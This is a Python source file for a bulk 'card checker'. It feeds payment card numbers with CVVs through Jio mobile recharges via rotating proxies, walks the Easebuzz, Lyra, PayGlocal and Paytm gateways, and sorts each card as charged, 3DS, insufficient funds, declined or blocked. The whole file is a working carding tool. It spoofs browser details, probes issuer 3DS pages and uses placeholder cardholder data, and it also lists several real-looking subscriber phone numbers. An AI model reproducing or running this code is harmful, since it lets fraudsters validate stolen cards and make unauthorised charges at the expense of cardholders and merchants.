"""Jio recharge card checker — takes cc + proxy + number, returns classified result.

Flow (optimized, fast): Jio -> JioPG -> Easebuzz -> Lyra(Visa)/PayGlocal(MC) -> classify.
Categories: charged, 3d, insufficient, declined, blocked, invalid, error.
"""
from __future__ import annotations

import base64
import json
import re
import time
from urllib.parse import parse_qs, urlparse

from client import JioClient, PayGlocalClient, ProxyPool
import gateways
from crypto import decrypt_public_key

PLAN_ID = "1019863"  # Rs 19 data pack


# Known-valid Jio subscriber numbers (user-supplied) for card-check testing.
JIO_NUMBERS = ["8779189177", "8369299064", "8169470539", "7667702392", "8252677013"]


def gen_jio_number() -> str:
    """Generate a random Jio-carrier 10-digit number via the phonenumbers library."""
    import random
    try:
        import phonenumbers
        from phonenumbers import carrier
        for _ in range(20):
            n = "9" + "".join(random.choices("0123456789", k=9))
            try:
                x = phonenumbers.parse("+91" + n, "IN")
                if phonenumbers.is_valid_number(x):
                    c = carrier.name_for_number(x, "en") or ""
                    if "jio" in c.lower() or "reliance" in c.lower():
                        return n
            except Exception:
                continue
    except Exception:
        pass
    return random.choice("6789") + "".join(random.choices("0123456789", k=9))


def normalize_proxy(proxy: str) -> str:
    """Normalize a proxy to http://user:pass@host:port for curl_cffi.
    Accepts: host:port:user:pass | http://host:port | user:pass@host:port | http://user:pass@host:port
    """
    p = proxy.strip()
    if "://" in p:
        return p
    if p.count(":") == 3:
        host, port, user, pw = p.split(":")
        return f"http://{user}:{pw}@{host}:{port}"
    if "@" in p and "://" not in p:
        return "http://" + p
    return "http://" + p

UA = ("Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/150.0.0.0 Safari/537.36")


def luhn_valid(n: str) -> bool:
    digits = [int(d) for d in n]
    s = 0
    for i, d in enumerate(reversed(digits)):
        if i % 2 == 1:
            d *= 2
            if d > 9:
                d -= 9
        s += d
    return s % 10 == 0


def parse_cc(cc: str) -> dict | None:
    """cc format: number|MM|YYYY|CVV  (or number|MM|YY|CVV)."""
    parts = cc.strip().split("|")
    if len(parts) != 4:
        return None
    number, mm, yyyy, cvv = [p.strip() for p in parts]
    if len(yyyy) == 2:
        yyyy = "20" + yyyy
    return {"number": number, "expiryMonth": mm, "expiryYear": yyyy, "cvv": cvv}


class RechargeChecker:
    def __init__(self, proxies_file: str, plans_file: str | None = None):
        self.pool = ProxyPool.from_file(proxies_file)
        import os as _os
        _pf = plans_file or _os.path.join(_os.path.dirname(_os.path.abspath(__file__)), "plans.json")
        try:
            self.plans = json.load(open(_pf))
        except Exception:
            self.plans = {}

    def _plan_id(self, amount) -> tuple:
        """Return (plan_id, plan_amount) for a requested amount."""
        m = self.plans.get(str(amount))
        if m:
            return m["id"], m["amount"]
        return None, None

    # ---------------- helpers ----------------
    def _jio_to_easebuzz(self, number: str, card: dict, proxy: str, plan_id: str) -> tuple:
        """Runs Jio -> JioPG -> on-ccdc-confirmation, returns (session, html_form)."""
        jc = JioClient(number=number, plan_id=plan_id, proxy=proxy)
        jc.bootstrap()
        pu = jc.initiate_recharge()
        form = jc.redirect_form(pu)
        if not form.get("action"):
            raise RuntimeError("no redirect form: " + form.get("body", ""))
        px1, px2 = jc.jiopg_payment_options(form["action"], form["fields"])
        auth = jc.authorize_card(card_prefix=card["number"][:6], sku_code=plan_id)
        token = auth["token"]
        invoke_url = auth["invokeUrl"]
        card_info = {
            "cardNumber": card["number"],
            "expiryMonth": card["expiryMonth"],
            "expiryYear": card["expiryYear"],
            "cardHolderName": "Test User",
            "cardType": "visa" if card["number"][0] == "4" else "mastercard",
            "cardTypeText": card["number"][:6],
            "customerCardTypeValue": "visa" if card["number"][0] == "4" else "mastercard",
        }
        invoke = jc.on_ccdc_confirmation(token, invoke_url, {**card_info, "cvv": card["cvv"]})
        html = invoke.get("htmlForm", "")
        return jc, html

    def _easebuzz_to_gateway(self, jc, html: str) -> dict:
        """POST Easebuzz encdata, detect + return gateway token/flow."""
        mact = re.search(r"action='([^']+)'", html)
        # Paytm Theia (txnToken + theia/*)
        mtxn = re.search(r"name='txnToken' value='([^']*)'", html)
        if mtxn and mact and "theia" in mact.group(1):
            return {"gateway": "paytm_theia",
                    "txnToken": mtxn.group(1),
                    "orderId": (re.search(r"name='orderId' value='([^']*)'", html) or [None, ""])[1],
                    "mid": (re.search(r"name='mid' value='([^']*)'", html) or [None, ""])[1],
                    "action": mact.group(1), "session": jc}
        # Paytm 3DS2 (secure.paytmpayments.com/instaproxy)
        mdata = re.search(r"name='data' value='([^']*)'", html)
        if mdata and mact and "paytmpayments" in mact.group(1):
            return {"gateway": "paytm", "data": mdata.group(1), "action": mact.group(1), "session": jc}
        # EMV 3DS 2.x challenge request (CReq -> ACS) comes first for 3DS-enrolled cards
        mcreq = re.search(r"name='creq' value='([^']*)'", html)
        if mcreq:
            threedss = re.search(r"name='threeDSSessionData' value='([^']*)'", html)
            acs_url = re.search(r"action='([^']+)'", html)
            return {"gateway": "3ds",
                    "acs_url": acs_url.group(1) if acs_url else None,
                    "creq": mcreq.group(1),
                    "threeDSSessionData": threedss.group(1) if threedss else "",
                    "session": jc}
        eb_action = re.search(r"action='([^']+)'", html)
        encdata = re.search(r"name='encdata'[^>]*value='([^']*)'", html)
        if not eb_action or not encdata:
            return {"gateway": "unknown", "error": "no easebuzz form", "body": html[:300]}
        r = jc.session.post(eb_action.group(1),
            headers={"Content-Type": "application/x-www-form-urlencoded",
                     "Accept": "text/html,application/xhtml+xml", "User-Agent": UA},
            data={"encdata": encdata.group(1)}, allow_redirects=True)
        body = r.text
        m = re.search(r'x-gl-token=([^&\s"\']+)', body)
        if m:
            return {"gateway": "payglocal", "xgl_token": m.group(1), "session": jc}
        # Lyra flow
        muuid = re.search(r'name="uuid"[^>]*value="([0-9a-f]{30,})"', body)
        mform = re.search(r'id="pg-response-form" action="([^"]+)"', body)
        if muuid:
            return {"gateway": "lyra", "uuid": muuid.group(1),
                    "resp_form": mform.group(1) if mform else None,
                    "session": jc, "easebuzz_body": body}
        return {"gateway": "unknown", "body": body[:300]}


    def _check_3ds(self, jc, gw) -> tuple:
        """POST CReq to the issuer ACS -> OTP challenge (3d) vs frictionless CRes."""
        if not gw.get("acs_url"):
            return "3d", "3DS challenge (no ACS url)"
        try:
            r = jc.session.post(gw["acs_url"],
                data={"creq": gw["creq"], "threeDSSessionData": gw["threeDSSessionData"]},
                headers={"Content-Type": "application/x-www-form-urlencoded",
                         "Accept": "text/html,application/xhtml+xml", "User-Agent": UA},
                allow_redirects=True, timeout=30)
        except Exception as e:
            return "error", f"3ds acs post failed: {type(e).__name__}: {e}"
        body = r.text
        # OTP / challenge page
        if re.search(r"name=['\"]otp['\"]", body) or "challengeInfoHeader" in body or "Secure Checkout" in body:
            return "3d", "3DS challenge (OTP required)"
        # frictionless CRes -> post back to the merchant callback
        mcres = re.search(r"name=['\"]cres['\"] value=['\"]([^'\"]+)['\"]", body)
        if mcres:
            return self._follow_cres(jc, mcres.group(1), body)
        return "3d", "3DS challenge (unrecognized ACS page)"

    def _follow_cres(self, jc, cres: str, body: str) -> tuple:
        """Frictionless: post CRes to the merchant 3DS callback -> terminal result."""
        maction = re.search(r"action=['\"]([^'\"]+)['\"]", body)
        if not maction:
            return "3d", "3DS frictionless (no cres callback url)"
        try:
            r = jc.session.post(maction.group(1), data={"cres": cres},
                headers={"Content-Type": "application/x-www-form-urlencoded",
                         "Accept": "text/html,application/xhtml+xml", "User-Agent": UA},
                allow_redirects=True, timeout=30)
        except Exception as e:
            return "error", f"cres post failed: {type(e).__name__}: {e}"
        low = r.text.lower()
        if "insufficient" in low or "not enough" in low:
            return "insufficient", "3DS frictionless insufficient funds"
        if "decline" in low or "fail" in low or "reject" in low:
            return "declined", "3DS frictionless declined"
        if "success" in low or "approved" in low or "charged" in low:
            return "charged", "3DS frictionless approved"
        return "3d", "3DS frictionless (result unclear)"

    # ---------------- PayGlocal ----------------
    @staticmethod
    def _build_billing_data(dc: dict) -> dict:
        """Replicates the payflow UI's Hn() billingData builder."""
        ptr = dc["data"]["payflowTxnResponse"]
        info = ptr.get("billingCollectionInfo") or {}
        fields = info.get("billingFields") or []
        meta = ptr.get("metaInfo", {})
        bd = {}
        for f in fields:
            name = f.get("fieldName"); val = f.get("value")
            if isinstance(val, str) and val:
                bd[name] = val
            elif name == "billing_state" and isinstance(val, list) and val:
                bd[name] = val[0]
        postal = bd.get("billing_addressPostalCode", "")
        city = bd.get("billing_city", "")
        state = bd.get("billing_state", "")
        iso2 = meta.get("iso2Code", "US")
        bd.setdefault("addressPostalCode", postal.upper())
        if city: bd["addressCity"] = city
        if state: bd["addressState"] = state
        bd["addressCountry"] = iso2.upper()
        bd.setdefault("fullName", "Test User")
        bd.setdefault("emailId", bd.get("billing_email", "test@test.com"))
        bd.setdefault("phoneNumber", bd.get("billing_phonenumber", "1234567890"))
        return bd

    def _check_payglocal(self, xgl_token: str, card: dict, jc, proxy: str) -> tuple:
        pg = PayGlocalClient(xgl_token=xgl_token, proxy=proxy)
        dc = pg.dc()
        ptr = dc["data"]["payflowTxnResponse"]
        disp = ptr["displayAmountInfo"]
        currency = disp["issuingCurrencyInfo"]["currency"]
        billing = self._build_billing_data(dc)
        visitor_id = "visitor_%d" % int(time.time())
        req_id = "%d.%d" % (int(time.time()*1000), int(time.time()*1000) % 100000)
        fp = pg.risk_fp(request_id=req_id, visitor_id=visitor_id)
        kid = fp["data"]["kid"]
        pem = decrypt_public_key(fp["data"]["key"], visitor_id)
        payload = {
            "cardData": {"number": card["number"], "expiryMonth": card["expiryMonth"],
                         "expiryYear": card["expiryYear"], "securityCode": card["cvv"]},
            "agreedOnSaveCard": "false", "sessionCardId": None,
            "saveCurrencyPreference": None, "customerCurrency": currency,
            "browserDetails": {"userAgent": UA, "screenWidth": 1920, "screenHeight": 1080,
                               "colorDepth": 24, "timezone": "Asia/Kolkata", "language": "en-US"},
            "billingData": billing,
        }
        r = pg.paynow(kid=kid, payload=payload, public_key_pem=pem)
        txn = disp.get("txnCurrencyInfo", {})
        price = f"{txn.get('amountData',{}).get('amount','19.6')} {txn.get('currency','INR')}"
        return ("payglocal", r, price)

    # ---------------- Lyra ----------------
    def _check_lyra(self, uuid: str, jc) -> tuple:
        device = {"type": "BROWSER", "colorDepth": 24, "width": 1920, "height": 1080}
        r = jc.session.post(
            f"https://api.in.lyra.com/public/v1/card/authenticate/{uuid}/submit",
            headers={"Content-Type": "application/json", "Accept": "application/json",
                     "Origin": "https://pay.easebuzz.in", "Referer": "https://pay.easebuzz.in/",
                     "User-Agent": UA},
            json={"instructionResult": None, "device": device})
        val = r.json().get("value", {})
        if val.get("responseType") == "CHALLENGE":
            # POST creq to ACS to determine blocked vs OTP
            http = val.get("http", {})
            creq = http.get("body", {}).get("creq")
            session_data = http.get("body", {}).get("threeDSSessionData")
            acs = jc.session.post(http.get("url"),
                headers={"Content-Type": "application/x-www-form-urlencoded",
                         "User-Agent": UA, "Accept": "text/html,application/xhtml+xml"},
                data={"creq": creq, "threeDSSessionData": session_data})
            return ("lyra", {"challenge_html": acs.text, "uuid": uuid,
                             "protocol": r.json().get("protocol")})
        return ("lyra", r.json())

    # ---------------- classification ----------------
    @staticmethod
    def classify(gateway: str, raw) -> tuple:
        """Returns (category, real_response_string)."""
        if gateway == "payglocal":
            d = raw
            status = d.get("status", "")
            code = d.get("reasonCode", "")
            msg = d.get("message", "")
            if status == "INPROGRESS" and "Cardinal" in json.dumps(d.get("data", {})):
                return "3d", f"{status} {code} {msg} (3DS challenge issued)"
            if "INSUFFICIENT" in (status + msg).upper():
                return "insufficient", f"{status} {code} {msg}"
            if "DECLINE" in (status + msg).upper() or "FAILED" in status.upper():
                return "declined", f"{status} {code} {msg}"
            if status in ("APPROVED", "SUCCESS", "CHARGED"):
                return "charged", f"{status} {code} {msg}"
            return "declined", f"{status} {code} {msg}"
        if gateway == "lyra":
            if isinstance(raw, dict) and "challenge_html" in raw:
                html = raw["challenge_html"]
                if "blocked" in html.lower():
                    return "blocked", "card blocked from Verified by Visa 3DS"
                if any(k in html.lower() for k in ["otp", "one time", "password", "challenge"]):
                    return "3d", "3DS challenge (OTP required)"
                return "3d", "3DS challenge issued"
            d = raw
            val = d.get("value", {})
            if val.get("status") == "REJECTED":
                return "declined", f"3DS REJECTED ({val.get('commerceIndicator','')})"
            if val.get("status") == "AUTHENTICATED":
                return "3d", "3DS authenticated"
            return "error", json.dumps(d)[:200]
        return "error", json.dumps(raw)[:200]

    # ---------------- Playwright (full real flow) ----------------

    def check(self, cc: str, number: str, proxy: str, amount: str = "19",
             extra_proxies=None) -> dict:
        t0 = time.time()
        card = parse_cc(cc)
        if not card:
            return self._result(cc, number, "invalid", "bad cc format", "none", t0)
        if not luhn_valid(card["number"]):
            return self._result(cc, number, "invalid", "card fails Luhn check", "none", t0)

        plan_id, plan_amt = self._plan_id(amount)
        if not plan_id:
            return self._result(cc, number, "error", f"amount ₹{amount} not available", "none", t0)
        price = f"{plan_amt} INR"

        proxy = normalize_proxy(proxy)
        try:
            jc, html = self._jio_to_easebuzz(number, card, proxy, plan_id)
            if not html:
                return self._result(cc, number, "error", "on-ccdc-confirmation returned no htmlForm",
                                    "jio", t0, price)
            gw = self._easebuzz_to_gateway(jc, html)
            gateway = gw["gateway"]
            if gateway == "payglocal":
                cat, real = gateways.payglocal_check(gw["xgl_token"], card, proxy,
                                       [normalize_proxy(x) for x in (extra_proxies or [])])
                return self._result(cc, number, cat, real, "payglocal", t0, price)
            elif gateway == "paytm":
                cat, real = gateways.paytm_check(jc, gw["data"], gw["action"])
                return self._result(cc, number, cat, real, "paytm", t0, price)
            elif gateway == "paytm_theia":
                cat, real = gateways.paytm_theia_check(jc, gw, number, card)
                return self._result(cc, number, cat, real, "paytm", t0, price)
            elif gateway == "3ds":
                cat, real = self._check_3ds(jc, gw)
                return self._result(cc, number, cat, real, "3ds", t0, price)
            elif gateway == "lyra":
                g, raw = self._check_lyra(gw["uuid"], jc)
            else:
                return self._result(cc, number, "error", "unknown gateway: " + gw.get("body", ""),
                                    "unknown", t0, price)
            category, real = self.classify(g, raw)
            return self._result(cc, number, category, real, gateway, t0, price)
        except Exception as e:
            return self._result(cc, number, "error", f"{type(e).__name__}: {e}", "unknown", t0, price)

    def _result(self, cc, number, category, real, gateway, t0, price="19.00 INR") -> dict:
        return {
            "cc": cc,
            "response": category,
            "real-response": real,
            "gateway": gateway,
            "price": price,
            "time": round(time.time() - t0, 2),
            "number": number,
        }
